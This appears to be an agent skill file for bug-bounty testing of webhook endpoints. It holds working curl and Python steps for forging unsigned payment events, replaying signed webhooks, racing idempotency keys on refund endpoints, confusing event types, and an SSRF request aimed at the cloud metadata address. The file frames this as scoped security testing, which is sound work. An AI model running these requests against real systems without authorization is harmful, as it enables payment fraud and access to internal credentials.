---
name: webhook_callback_hunter
description: Webhook callback security — signature bypass, replay attacks, timestamp-window abuse, SSRF through callbacks, event-type confusion, idempotency-key bugs, stale secrets, payment webhook mismatch.
---

# Webhook Callback Hunter

Webhook handlers are a high-impact surface. They bypass authentication by design, operate on untrusted event data, and often write directly to production state. Most programs delegate webhook verification to third-party libraries that implement HMAC-SHA256 verification, but misconfigurations are routine: weak timestamp windows, skipped validation logic, race conditions in idempotency checks, and old API key secrets that remain valid after rotation.

This pack composes with `shared/scope_guard.md`, `packs/web_hunter/SKILL.md` (webhook discovery), `packs/triage_validation/SKILL.md` (evidence discipline), and `packs/race_hunter/SKILL.md` (idempotency-key races).

## When to Use

- Target has documented webhook endpoints (payment processors, messaging providers, source-host integrations, custom internal webhooks).
- Endpoint accepts `X-Signature` or `Authorization: Bearer` headers with HMAC/JWT verification.
- Endpoint processes payment, order, refund, or account-state events.
- Endpoint implements idempotency-key deduplication or timestamp-based replay protection.
- Third-party integrations (payment-platform connect flows, OAuth token-refresh webhooks) exist.

## Operating Rules

- Scope: confirm webhook testing is in-scope. Some programs forbid external webhook simulation.
- Secrets: never store API keys in evidence artifacts. Test with publicly-available payloads or synthetic events.
- State: do not mutate real payment state beyond a single proof action (e.g., one refund, not 100).
- Replay window: calculate the server's acceptable timestamp drift (usually 5–300 seconds) and document it.

## Phase 0: Webhook Discovery

Identify all webhook endpoints in your target:

```bash
grep -r "webhook\|callback\|event\|signature" /swagger /openapi /postman --include="*.json" --include="*.yaml"
```

Common patterns:
- `/api/webhooks/<provider>` or `/api/events/<provider>`
- `/api/payment/webhook` or `/webhooks/external`
- `POST /api/integrations/{provider}/callback`

Document:
- URL
- Required headers (Signature, Authorization, X-Webhook-ID)
- Body schema
- Expected event types

## Phase 1: Signature Verification Logic

### A. Is signature verification skipped?

Test with a malformed signature or no signature:

```bash
curl -X POST https://target.com/api/webhooks/<provider> \
  -H "Content-Type: application/json" \
  -d '{"type":"payment.succeeded","data":{"amount":9999}}' \
  -w "\n%{http_code}\n"
```

If 200 — signature is not verified. Critical finding.

### B. Does the signature algorithm match documentation?

Most providers use `HMAC-SHA256(secret, body)`. Verify:

```python
import hmac, hashlib, json
payload = json.dumps({"type": "charge.succeeded"}).encode()
secret = b"whsec_..." # from .env or docs
expected_sig = hmac.new(secret, payload, hashlib.sha256).hexdigest()
print(f"Expected: {expected_sig}")
```

### C. Timestamp replay window

Extract the timestamp from signature header (if present):

```bash
# Common signature header format: t=<timestamp>,v1=<signature>
SIG_HEADER="t=1234567890,v1=abc123"
echo $SIG_HEADER | cut -d= -f2 | cut -d, -f1  # Extract timestamp
```

Calculate server's drift tolerance:

```python
# Test with timestamp = now - X seconds for various X
for drift_sec in [5, 10, 60, 300, 3600]:
    old_ts = int(time.time()) - drift_sec
    sig = create_signed_request(secret, body, old_ts)
    # POST with old sig — measure at what drift it rejects
```

Document the window. Windows >300 seconds are exploitable.

### D. Idempotency key handling

Check if endpoint deduplicates via idempotency-key:

```bash
# Send twice with same idempotency-key
IDEMPOTENCY_KEY="test-key-123"
curl -X POST https://target.com/api/webhooks/event \
  -H "Idempotency-Key: $IDEMPOTENCY_KEY" \
  -H "X-Signature: ..." \
  -d '{"type":"order.paid","orderId":"123"}'

# Send again — should return cached response (same status, idempotent effect)
curl -X POST https://target.com/api/webhooks/event \
  -H "Idempotency-Key: $IDEMPOTENCY_KEY" \
  -H "X-Signature: ..." \
  -d '{"type":"order.paid","orderId":"123"}'
```

### E. Event-type validation

Does the endpoint validate that the event type matches the context?

```bash
# POST to /webhooks/refund with a payment.succeeded event
curl -X POST https://target.com/api/webhooks/refund \
  -H "X-Signature: ..." \
  -d '{"type":"charge.succeeded","chargeId":"ch_..."}'
```

If accepted — event-type confusion. Critical.

## Phase 2: Exploit Variants

### A. Signature Replay

Capture a legitimate webhook from test data. Replay it N times with no modification (same signature, same timestamp):

```bash
ORIGINAL_BODY='{"type":"payment.succeeded","customerId":"123","amount":5000}'
ORIGINAL_SIG='t=1234567890,v1=abc123'

# Replay 5 times
for i in {1..5}; do
  curl -X POST https://target.com/api/webhooks/payment \
    -H "X-Webhook-Signature: $ORIGINAL_SIG" \
    -H "Content-Type: application/json" \
    -d "$ORIGINAL_BODY"
done
```

Evidence: check if state mutated 5 times (e.g., 5 refunds created, 5 credits added).

### B. Idempotency-Key Race

Send two requests with the same idempotency-key in rapid succession (before the first completes):

```bash
IDEMPOTENCY_KEY="race-key-$(date +%s)"
# Terminal 1
curl -X POST https://target.com/api/webhooks/refund \
  -H "Idempotency-Key: $IDEMPOTENCY_KEY" \
  -H "X-Signature: ..." \
  -d '{"type":"order.refunded","orderId":"order_123","amount":1000}'

# Terminal 2 (within 100ms)
curl -X POST https://target.com/api/webhooks/refund \
  -H "Idempotency-Key: $IDEMPOTENCY_KEY" \
  -H "X-Signature: ..." \
  -d '{"type":"order.refunded","orderId":"order_123","amount":1000}'
```

Check: did state mutate once (cached second request) or twice (race bug)?

### C. SSRF via Callback URL

If webhook endpoint accepts a callback URL parameter:

```bash
curl -X POST https://target.com/api/webhooks/register \
  -H "Content-Type: application/json" \
  -d '{"callback":"http://169.254.169.254/latest/meta-data/","type":"test"}'
```

Attempt to reach internal services. Log response timing/content.

## Phase 3: Evidence Collection

Store under `webhook_<provider>_<timestamp>/`:

- `01_discovery.md` — all webhook endpoints and event types.
- `02_signature_validation.txt` — verification logic and timestamp drift result.
- `03_replay_baseline.har` — single legitimate webhook, single state mutation.
- `04_replay_n5.har` — replay 5 times, N state mutations captured.
- `05_idempotency_race.txt` — race result (idempotent vs. duplicate).
- `06_event_type_confusion.har` — mismatched event type accepted.
- `07_state_diff.json` — before/after state showing the mutation.

## Exclusions

- No consuming real-world payment inventory beyond proof (single refund, single credit).
- No SSRF to truly sensitive services (database, K8s API) unless explicitly in-scope.
- No DoS on webhook queues (spamming old signatures with high concurrency is out-of-scope).
- No leaking API keys or secrets in evidence.

## See Also

- `agent_skills/packs/race_hunter/SKILL.md` — idempotency-key race exploitation
- `agent_skills/packs/billing_abuse_hunter/SKILL.md` — payment state machine attacks
- `agent_skills/packs/api_security/SKILL.md` — API authentication bypass
- `agent_skills/packs/triage_validation/SKILL.md` — submission gates
- Webhook signature verification and replay-protection best practices.
